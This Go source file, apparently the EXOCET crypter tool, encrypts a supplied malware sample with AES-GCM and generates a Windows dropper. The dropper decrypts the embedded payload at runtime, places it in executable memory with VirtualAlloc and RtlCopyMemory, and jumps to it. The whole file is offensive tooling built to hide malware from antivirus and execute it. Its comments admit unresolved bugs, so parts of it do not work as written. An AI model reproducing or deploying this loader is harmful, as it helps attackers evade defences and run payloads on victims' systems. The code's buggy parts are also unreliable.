package ExecShellcode

import (
"crypto/aes"
"crypto/cipher"
"crypto/md5"
"crypto/rand"
"encoding/hex"
"fmt"
"io"
"io/ioutil"
"os"
)
//https://www.thepolyglotdeveloper.com/2018/02/encrypt-decrypt-data-golang-application-crypto-packages/
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func encrypt(data []byte, passphrase string) []byte {
	// creates a password hash
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	// Galois Counter Mode Encryption, superior to AES Cipher Block Chaining
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	// Returns ciphertext as bytes
	//fmt.Printf("%x", ciphertext)
	return ciphertext

}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func encryptFile(filename string, data []byte, passphrase string) {
	// Need to change this, to allow reading of files and encrypting it
	// This merely creates a file that is encrypted with a string
	f, _ := os.Create(filename)
	defer f.Close()
	f.Write(encrypt(data, passphrase))
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func decryptMalware(encryptedMalware []byte, passphrase string) []byte {
	return decrypt(encryptedMalware, passphrase)
}

func encryptMalware(origMalware []byte, passphrase string) []byte {
	encryptedMalware := encrypt(origMalware, passphrase)
	//hexEncryptedMalware := fmt.Sprintf("%x",encryptedMalware)
	return encryptedMalware
}
//func readMalware(filename string) []byte {
//	var dat []byte
//	dat, err := ioutil.ReadFile(filename)
//	if err != nil {
//		fmt.Println("Error in readMalware(): %s",err)
//	}
//	return dat, err
//}
func writePayload(hexEncryptedMalware []byte, outputMalware string, encryptionPassword string) {
	//var templateGoFile []byte
	templateGoFile := fmt.Sprintf(`
package main
import (
	"unsafe"
	"syscall"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")

    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	dat := "%x"
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), "%s")
	/*Shellcode is correctly decrypted*/
	// Note: After the decryption process, we need to just add it as a string here, and have this function typecast it into bytes.
	//var shellcode = []byte(decryptedDat)
	var shellcode = []byte{decryptedDat}
/*
Now we are hitting access violations. exit status 0xc0000005, check for DEP in WinDBG
*/
	addr, _, err := VirtualAlloc.Call(
	0, 
	uintptr(len(shellcode)), 
	MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	
	_, _, err = RtlCopyMemory.Call(
		addr, 
		(uintptr)(unsafe.Pointer(&shellcode[0])), 
		uintptr(len(shellcode)))
	
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	
	// jump to shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}`, hexEncryptedMalware, encryptionPassword)
	ioutil.WriteFile(outputMalware, []byte(templateGoFile), 0777)
}
func main() {
	//fmt.Println("Starting the")
	fmt.Printf(`
The EXOCET Project. Part of the Slayer-Ranger's DSX Weapons Program.
`)
	args := os.Args
	if len(os.Args) < 4 {
		fmt.Printf("How to use:\r\n\tgo run EXOCET.go $PATH/malware outputMalware.go encryptionPassword\n")
		os.Exit(3)
	}
	origMalware := args[1]
	outputMalware := args[2]
	encryptionPassword := args[3]
	fmt.Printf("Original malware sample selected: %s\n",origMalware)
	fmt.Printf("Output malware sample selected: %s\n",outputMalware)
	fmt.Printf("Encryption password for AES Galois/Counter Mode %s\n", encryptionPassword)

	dat, err := ioutil.ReadFile(origMalware)
	//b64dat := base64.StdEncoding.EncodeToString(dat)
	if err != nil {
		fmt.Println(err)
	}

	// Attempt to create a hex encoded payload in another go file, where that other go file serves as a dropper
	hexEncryptedMalware := encryptMalware(dat, encryptionPassword)
	writePayload(hexEncryptedMalware, outputMalware, encryptionPassword)
	fmt.Printf("The encrypted implant has been completed, however you must run golang and gcc on Windows using the Windows toolchain with go build %s\r\nPlease get your toolchain for CGO from https://www.msys2.org/ and add it to your PATH environment variable, sorry for the difficulty", outputMalware)
}
